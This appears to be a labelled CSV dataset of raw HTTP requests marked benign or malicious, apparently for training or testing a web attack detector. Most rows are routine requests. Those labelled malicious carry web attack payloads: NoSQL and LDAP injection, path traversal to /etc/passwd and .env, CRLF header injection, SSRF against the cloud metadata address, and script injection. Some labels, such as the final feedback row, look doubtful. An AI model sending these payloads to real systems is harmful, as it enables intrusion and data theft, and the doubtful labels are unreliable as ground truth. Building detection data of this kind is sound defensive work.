label,text
malicious,"POST /user/filter HTTP/1.1
Host: community.game-dev-forum.org
User-Agent: Mozilla/5.0 (Linux; Android 11; Pixel 5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.120 Mobile Safari/537.36
Accept: application/json
Accept-Encoding: gzip, deflate, br
Content-Type: application/json
Content-Length: 200
Referer: https://community.game-dev-forum.org/filter
Connection: keep-alive

{""query"":{""$where"":""this.username == 'admin' && (this.password.startsWith('a') || sleep(3200))""},""limit"":10,""fields"":{""email"":1}}"
benign,"POST /api/v4/product/review HTTP/1.1
Host: online-retail-store.biz
Connection: keep-alive
Content-Type: application/json
X-Requested-With: XMLHttpRequest
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.1.2 Safari/605.1.15
Accept: application/json, text/javascript
Referer: https://online-retail-store.biz/products/kitchen/blender/details
Content-Length: 113
Cookie: session_id=ef901234abcb; tracking=123xy567z

{""productId"":3345,""rating"":4,""title"":""Good blender"",""review"":""Works well for smoothies and sauces.""}"
benign,"OPTIONS /api/v2/session/start HTTP/1.1
Host: session-manager-platform.org
Origin: https://user-portal.session-manager-platform.org
Access-Control-Request-Method: POST
Access-Control-Request-Headers: content-type, authorization
User-Agent: Mozilla/5.0 (iPhone; CPU iPhone OS 16_4 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.4 Mobile/15E148 Safari/604.1
Accept: application/json
Connection: keep-alive"
benign,"POST /api/v1/user/preferences/update HTTP/1.1
Host: appdata-sync-service.io
Authorization: Bearer Qp4C8VXYzeA7KwJn31dslv86Tar0qu9nRlHs
Content-Type: application/json
Idempotency-Key: 44d6d5e8-29bd-438f-9c75-89eebae86ff9
X-Request-ID: 2cfa1d98-bd9f-44bb-b38c-12a7f748532e
X-Client-Version: 4.12.3
Accept: application/json
X-Forwarded-For: 203.0.113.42
User-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.0.0 Safari/537.36
Content-Length: 102

{""userId"": ""usr-129372"", ""language"": ""fr-FR"", ""timezone"": ""Europe/Paris"", ""notifications"": {""email"": false, ""push"": true}}"
benign,"POST /profile/contact HTTP/1.1
Host: user-networking-hub.co.uk
Content-Type: application/x-www-form-urlencoded
Content-Length: 39
Accept-Encoding: gzip, deflate
User-Agent: Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)
Connection: keep-alive

email=contact%40newuser.net&phone=&preferred_contact=email"
malicious,"GET /viewer?file=../../../../../../../../etc/passwd HTTP/1.1
Host: digital-marketing-hub.tech
User-Agent: Mozilla/5.0 (Linux; Android 11; Pixel 5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.120 Mobile Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.8
Connection: keep-alive"
benign,"GET /data/user/notifications HTTP/1.1
Host: api.cloud-storage-services.tech
Accept: application/json
App-Secret: 7c98f4e3adbb45d1b556f8957ce0e2a8
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 13_3) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.5 Safari/605.1.15
Cache-Control: no-cache
Connection: keep-alive"
benign,"POST /collect/user_event HTTP/1.1
Host: logs.community-dev-forum.org
Origin: https://community-dev-forum.org
Content-Type: text/plain
User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:98.0) Gecko/20100101 Firefox/98.0
Content-Length: 62

{""event"":""scroll"",""position"":720,""page"":""/topics/3423""}"
benign,"GET /search/users?query=justin+elliott&page=1 HTTP/1.1
Host: social-horizon.org
Connection: keep-alive
Accept: text/html,application/xhtml+xml
Referer: https://social-horizon.org/friends/suggestions
Cookie: sid=8a7b6d1cc45f1029; auth=token_4fd728c2b22f
User-Agent: Mozilla/5.0 (Linux; Android 12; SM-G991B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/113.0.5672.126 Mobile Safari/537.36
Accept-Language: en-US,en;q=0.9"
benign,"GET /search?q=books&comment=This%20is%20%26lt%3Bbold%26gt%3B HTTP/1.1
Host: api.cloud-data-services.ai
Accept: application/json
User-Agent: python-requests/2.28.1
Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9
Connection: keep-alive"
benign,"GET /v3/financial/reports/quarterly?year=2023&quarter=4 HTTP/1.1
Host: secure-finance-data.net
Accept: application/json
X-Api-Token: 9384657df2e14d1ba14111c8debe1a8e
User-Agent: python-requests/2.28.1
Accept-Encoding: gzip, deflate, br"
benign,"PUT /user-data/backup/94f812b33a7f HTTP/1.1
Host: backup-cloud-service.ai
Content-Type: application/octet-stream
Content-Length: 197
Accept-Encoding: gzip, deflate
User-Agent: python-requests/2.28.1
X-Forwarded-For: 192.168.10.15
Authorization: Token 62fbe1e344bfcd773a81f0f64a9da737
Pragma: no-cache
Connection: keep-alive

UEsDBBQACAAIAMZY2lQAAAAAAAAAAAAAAAAFAAALdGV4dC9UYXNrLTEuanNvblVUCQADRp0CzmYdAs
AAAgAAAAAAABQSwcIeXz5GYYAAAAMAAA=="
benign,"GET /search/v2/resources?data=%7B%22filter%22%3A%22active%22%7D HTTP/1.1
Host: devtools.tech-resources.io
User-Agent: python-requests/2.28.1
Accept: application/json
Accept-Language: en-US,en;q=0.9
X-Forwarded-For: 203.0.113.56
Connection: keep-alive"
benign,"PUT /api/v1/products/electronics/tv/details HTTP/1.1
Host: online-retail-store.biz
Authorization: Bearer QWeRTy1234567890tokenooo
Content-Type: application/xml
Accept: application/xml
User-Agent: Mozilla/5.0 (X11; Linux x86_64) Gecko/20100101 Firefox/109.0
Content-Length: 119

<?xml version=""1.0""?>
<product>
  <model>UltraView 55X</model>
  <price>899.99</price>
  <availability>in_stock</availability>
</product>"
benign,"POST /forum/threads/3129/comment HTTP/1.1
Host: retro-gaming-hub.com
User-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.0.0 Safari/537.36
Content-Type: application/x-www-form-urlencoded
Content-Length: 109
Referer: https://retro-gaming-hub.com/forum/threads/3129
Cookie: user_session=8c0a739d320fe3e984e5d34a284fb6f3; csrf_token=2f29b5dea1724f62a2d3
Connection: keep-alive

author_name=Ethan+Miller&comment_text=Great+discussion+on+the+rare+NES+cartridges.+I+collected+some+too!&csrf_token=2f29b5dea1724f62a2d3"
benign,"DELETE /api/v5/notifications/9a3fe7 HTTP/1.1
Host: realtime-alerts-service.devops.io
Authorization: Bearer vG7Uz2rD46M4HQiWw2lL08s3dh9NkJTPheLf29rGCpa
User-Agent: Mozilla/5.0 (Linux; Android 13; SM-G991B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/113.0.5672.127 Mobile Safari/537.36
Accept: application/json, text/plain, */*
Connection: keep-alive
Accept-Encoding: gzip, deflate, br
Origin: https://dashboard.devops.io"
malicious,"GET /media/upload/filename%0d%0aX-Hacked:%20true%0d%0a%0d%0a<script>prompt('Injected')</script> HTTP/1.1
Host: file-hosting-service.cloud
User-Agent: Wget/1.21.1 (linux-gnu)
Accept: */*
Accept-Encoding: identity
Connection: keep-alive"
benign,"GET /resources/export?file=report-final.pdf HTTP/1.1
Host: devops-tools-platform.dev
User-Agent: python-requests/2.28.2
Accept-Encoding: gzip, deflate, br
Accept: application/json
Connection: keep-alive
Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.dummy.token.string"
benign,"PATCH /api/documents/KL3829 HTTP/1.1
Host: corporate-docs-archive.cloudvault.ai
Authorization: Bearer 1a2b3c4d5e6f7g8h9i0jklmnopqrstuv
Content-Type: application/merge-patch+json
Accept: application/json
User-Agent: Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)
Content-Length: 45

{""tags"": [""archived"", ""reviewed""], ""confidential"": false}"
benign,"HEAD /public/downloads/installer_latest.dmg HTTP/1.1
Host: macsoftware-hub.net
User-Agent: Mozilla/5.0 (iPhone; CPU iPhone OS 16_2 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.2 Mobile/15E148 Safari/604.1
Accept: */*
Connection: keep-alive"
benign,"GET /community/forum/posts/view/78945?comments=all HTTP/1.1
Host: community.game-dev-forum.org
Accept: text/html,application/xhtml+xml
Accept-Language: en-US,en;q=0.7
Accept-Encoding: gzip, deflate
Cookie: forum_session=3a91b4682acf17a26f4bf837; user_auth=logged_in; tracking_id=6d9b7edae9458812
Connection: keep-alive
Referer: https://community.game-dev-forum.org/community/forum/posts
User-Agent: Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:109.0) Gecko/20100101 Firefox/115.0"
benign,"HEAD /downloads/linux/distributions/minimal.iso HTTP/1.1
Host: distro-isos-server.org
User-Agent: aria2/1.36.0
Accept: application/octet-stream
Accept-Encoding: identity
Connection: keep-alive"
malicious,"GET /event/register?email=user@example.com%0d%0aSet-Cookie:%20eventPass=gold HTTP/1.1
Host: tickets.booking-zone.org
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36
Accept-Language: en-US,en;q=0.9
Referer: https://tickets.booking-zone.org/events
Connection: keep-alive"
benign,"GET /products;category=books/reviews;lang=en_US HTTP/1.1
Host: book-review-hub.ai
User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:114.0) Gecko/20100101 Firefox/114.0
Accept: text/html
Accept-Encoding: gzip, deflate
Accept-Language: en-US,en;q=0.5
Cache-Control: max-age=0
Connection: keep-alive"
malicious,"POST /api/v2/profile/edit HTTP/1.1
Host: api.cloud-data-services.ai
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.1.1 Safari/605.1.15
Accept: application/xml,application/xhtml+xml,text/html;q=0.9
Accept-Encoding: gzip, deflate
Content-Type: application/x-www-form-urlencoded
Content-Length: 102
Cache-Control: no-cache

comment=nice%20profile&username=john_doe&action=edit&username=superadmin&action=delete&comment=%3Cscript%3Ealert(1)%3C%2Fscript%3E"
benign,"GET /blog/post/2034-how-to-succeed-in-remote-work HTTP/1.1
Host: productivity-boosters.info
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Encoding: gzip, deflate, br
Accept-Language: en-US,en;q=0.9
Cache-Control: max-age=0
Connection: keep-alive
User-Agent: Mozilla/5.0 (iPad; CPU OS 14_5 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.1 Mobile/15E148 Safari/604.1
Referer: https://productivity-boosters.info/blog"
benign,"PUT /api/v1/users/8472/profile HTTP/1.1
Host: profile-update-service.tech
Content-Type: application/json
Content-Length: 56
Accept: application/json
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Safari/537.36
Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9
Connection: keep-alive

{""bio"": ""Enthusiast of &lt;code&gt;Python&lt;/code&gt; and &lt;b&gt;HTML&lt;/b&gt;!""}"
benign,"GET /blog/article/view/123?cmd=view_details HTTP/1.1
Host: modern-tech-news.net
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 13_4_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/113.0.5672.63 Safari/537.36
Connection: keep-alive
Accept-Encoding: gzip, deflate, br
Accept-Language: en-US,en;q=0.8
Referer: https://modern-tech-news.net/blog
Upgrade-Insecure-Requests: 1"
malicious,"GET /api/fetch_image?imageUrl=http://169.254.169.254/latest/meta-data/ HTTP/1.1
Host: media-secure-harvester.net
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.114 Safari/537.36
Accept: image/webp,image/apng,image/*,*/*;q=0.8
Accept-Language: en-US,en;q=0.9
Referer: https://media-secure-harvester.net/gallery/view
Connection: close"
benign,"PUT /api/v1/profile/update HTTP/1.1
Host: user-data-sync.net
If-Match: ""3e86-59f8a4c9d7b50""
Content-Type: application/json
Accept: application/json
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/115.0.0.0 Safari/537.36
Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VyIjoiMzY1In0._Q8OtkT6uFmXhkQfBAzbgWjAsujFHzQPxeaS1E03T3s
Content-Length: 72

{""firstName"": ""Eleanor"", ""lastName"": ""Riggs"", ""preferences"": {""newsletter"": false}}"
benign,"GET /wiki/Resource_(disambiguation) HTTP/1.1
Host: specialized-wiki-archive.net
User-Agent: Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Safari/537.36 Edg/114.0.1823.43
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8
Accept-Encoding: gzip, deflate, br
Accept-Language: en-US,en;q=0.9
Connection: keep-alive
Referer: https://specialized-wiki-archive.net/wiki/Main_Page"
benign,"GET /download/reports/monthly?file=%4a%5b%6C%7d HTTP/1.1
Host: reports.enterprise-solutions.co
User-Agent: Mozilla/5.0 (compatible; Bingbot/2.0; +http://www.bing.com/bingbot.htm)
Accept: application/pdf,application/msword
Accept-Language: en-US,en;q=0.8
Cache-Control: max-age=600
Connection: keep-alive"
malicious,"GET /content/load HTTP/1.1
Host: realtime-analytics-platform.net
User-Agent: Wget/1.21.1 (linux-gnu)
Accept: */*
Cookie: theme_path=../../../../var/www/html/.env%00backup; user_id=998877
Cache-Control: no-cache"
benign,"POST /account/settings HTTP/1.1
Host: secure-user-portal.net
Content-Type: application/x-www-form-urlencoded
Content-Length: 92
Referer: https://secure-user-portal.net/account/settings
Origin: https://secure-user-portal.net
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.1 Safari/605.1.15
Cookie: sid=YU89tiV7l; path=/; HttpOnly
Accept-Language: en-US,en;q=0.9
Cache-Control: no-cache
Connection: close

display_name=GreenLeafGardener&bio=Passionate+about+sustainable+gardening.&website_url=https%3A%2F%2Fgreenleafgarden.blog&location=Austin%2C+Texas"
benign,"GET /docs/manuals/setup-guide.pdf HTTP/1.1
Host: corporate-it-resources.biz
Accept: application/pdf
Accept-Language: en-US
Referer: https://office-support-portal.org/account/settings
Connection: keep-alive
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/15.1 Safari/605.1.15"
benign,"GET /products/electronics/laptops/ultrabook-x9/details HTTP/1.1
Host: online-retail-store.biz
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Encoding: br, gzip, deflate
Accept-Language: en-US,en;q=0.9
Cookie: sessionId=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.e30.X7JN9smJLiBi4BDQFvO8O8RHz_64YU-gh0TnbiIb0oQ
User-Agent: Mozilla/5.0 (Linux; Android 13; SM-G998B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.5735.196 Mobile Safari/537.36
Connection: keep-alive"
malicious,"GET /user/profile HTTP/1.1
Host: my-personal-blog-site.info
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:89.0) Gecko/20100101 Firefox/89.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Cookie: session_filter=(uid=badguy%00"
malicious,"POST /user/login HTTP/1.1
Host: online-retail-store.biz
User-Agent: Mozilla/5.0 (Linux; Android 11; Pixel 5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.120 Mobile Safari/537.36
Content-Type: application/x-www-form-urlencoded
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Origin: https://online-retail-store.biz
Content-Length: 58
Connection: keep-alive

username=shopper%00%01%00<script>fetch('/steal')</script>&password=secret"
malicious,"GET /dashboard/settings HTTP/1.1
Host: secure-user-portal.net
X-User-Filter: {""$where"": ""if (this.isAdmin) { var d=new Date(); while((new Date())-d<=5000){ } }; return true;""}
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:89.0) Gecko/20100101 Firefox/89.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Cache-Control: no-cache
Pragma: no-cache
Connection: close"
benign,"GET /weather/today?city=seattle HTTP/1.1
Host: outdoor-activity-planner.net
Connection: keep-alive
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Language: en-US
Accept-Encoding: gzip, deflate, br
Referer: https://outdoor-activity-planner.net/dashboard
User-Agent: Mozilla/5.0 (iPhone; CPU iPhone OS 16_3 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.0 Mobile/15E148 Safari/604.1"
malicious,"PUT /api/v2/user/settings HTTP/1.1
Host: user-management-suite.cloud
User-Agent: Python-urllib/3.9
Accept: application/json
Content-Type: application/json
Cookie: theme_file=../../../../themes/default/main.css%00en-GB; jwt=eyJhbGciOiJSUzI1NiIsImtpZCI6IjY2NjY2In0
Content-Length: 39

{""notifications"":true,""language"":""en-US""}"
benign,"OPTIONS /api/v1/accounts/8492 HTTP/1.1
Host: data-analytics-platform.ai
Origin: https://frontend.clientwidget.net
Access-Control-Request-Method: PUT
Access-Control-Request-Headers: content-type, x-custom-header, x-api-key
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/113.0.0.0 Safari/537.36
Accept: */*
Connection: keep-alive"
benign,"POST /community/discussions/new HTTP/1.1
Host: devtalks-webhub.org
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:91.0) Gecko/20100101 Firefox/91.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Content-Type: application/x-www-form-urlencoded
Content-Length: 187
Connection: keep-alive
Cookie: session_sid=34f90a12b8571c0d

forum_post=Hi+everyone%2C+I+am+trying+to+understand+how+to+use+the+%3Cdiv%3E+tag+in+HTML.+Should+I+select+it+with+document.getElementById%28%27container%27%29+or+use+querySelector%3F"
benign,"POST /account/create HTTP/1.1
Host: secure-user-portal.net
Content-Type: application/x-www-form-urlencoded
Content-Length: 88
Referer: https://secure-user-portal.net/signup
Origin: https://secure-user-portal.net
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 12_3_1) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.2 Safari/605.1.15
Cookie: csrftoken=3a8x0k9evnjt403h9u39yv; session_token=eyJhbGci
Connection: keep-alive

username=ryan_clarkson&email=ryan.clarkson%40secureuser.io&password=BlueSkies22&password_confirm=BlueSkies22&terms_accepted=true"
malicious,"POST /track/log HTTP/1.1
Host: app-beacon-service.cloud
User-Agent: Python-urllib/3.9
Content-Type: application/json
Accept-Encoding: gzip
Content-Length: 258
Connection: keep-alive

{""token"":""T3872kfhe"", ""event_details"":""Button click registered\"", \""status_code\"": 200, \""user_id\"": \""admin\"", \""is_privileged\"": true, \""original_event\"": \""btn_click""}"
benign,"HEAD /index.html HTTP/1.1
Host: online-retail-store.biz
User-Agent: Mozilla/5.0 (Linux; Android 12; SM-G991B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/113.0.5672.92 Mobile Safari/537.36
Accept: text/html
Accept-Encoding: gzip, deflate
Accept-Language: en-US,en;q=0.9
Connection: keep-alive
Cookie: session_token=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9"
benign,"POST /logout HTTP/1.1
Host: online-retail-store.biz
Content-Type: application/x-www-form-urlencoded
Referer: https://online-retail-store.biz/cart
Cookie: user_session=4d74bc51f8e940d292a6c21847f99523
User-Agent: Mozilla/5.0 (Linux; Android 12; SM-G991B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.5615.87 Mobile Safari/537.36
Content-Length: 24
Connection: close

csrf_token=4e7e1bc9a3f840f08d87fbc0"
malicious,"POST /feedback/send HTTP/1.1
Host: feedback-collector-service.net
User-Agent: Mozilla/5.0 (iPhone; CPU iPhone OS 14_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.0 Mobile/15E148 Safari/604.1
Accept: text/plain, */*; q=0.01
Content-Type: text/plain
Referer: https://trusted-marketing-partners.org/referral/start
Content-Length: 69
Cookie: feedback_token=9b124da8d0b7e3a041c158937ab238ef

User experienced issues with loading the homepage quickly but otherwise great service."
